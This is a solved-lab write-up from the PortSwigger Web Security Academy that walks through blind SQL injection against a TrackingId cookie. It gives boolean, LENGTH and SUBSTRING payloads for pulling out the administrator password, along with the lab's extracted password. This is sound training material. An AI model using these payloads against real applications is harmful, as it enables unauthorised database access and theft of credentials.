# Blind SQL Injection – Conditional Responses

**Platform:** PortSwigger Web Security Academy

**Category:** SQL Injection

**Difficulty:** Practitioner

**Status:** Solved

**Tool:** Burp Suite

## Lab Description

The application contains a blind SQL injection vulnerability in the `TrackingId` cookie.

The application does not return SQL query results or display database errors. However, it displays a `Welcome back` message when the injected query returns rows.

**Objective:** Extract the administrator's password and log in as the administrator.

## Exploitation

### 1. Confirm SQL Injection

Injected the following payload into the `TrackingId` cookie:

```sql
' AND 1=1--
```

The `Welcome back` message appeared, confirming that the condition was TRUE.

### 2. Confirm the Users Table

```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

The application displayed the `Welcome back` message, confirming that the `users` table exists.

### 3. Identify the Administrator Account

```sql
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
```

The condition returned TRUE, confirming the administrator account and that its password contains more than one character.

### 4. Extract the Administrator Password

Used the `SUBSTRING()` function to retrieve the password one character at a time.

Example:

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

Repeated the process by changing the character position and testing possible characters.

### Extracted Password

```text
1vp254ggxtnmqq3ngrr0
```

## Result

Successfully extracted the administrator's password using blind SQL injection with conditional responses and logged in as the administrator.

## Key Takeaways

* Blind SQL injection can expose database information without displaying query results.
* Conditional responses provide a TRUE/FALSE indicator.
* `SUBSTRING()` allows character-by-character password extraction.
* `LENGTH()` helps determine password length.
* Parameterized queries help prevent SQL injection.

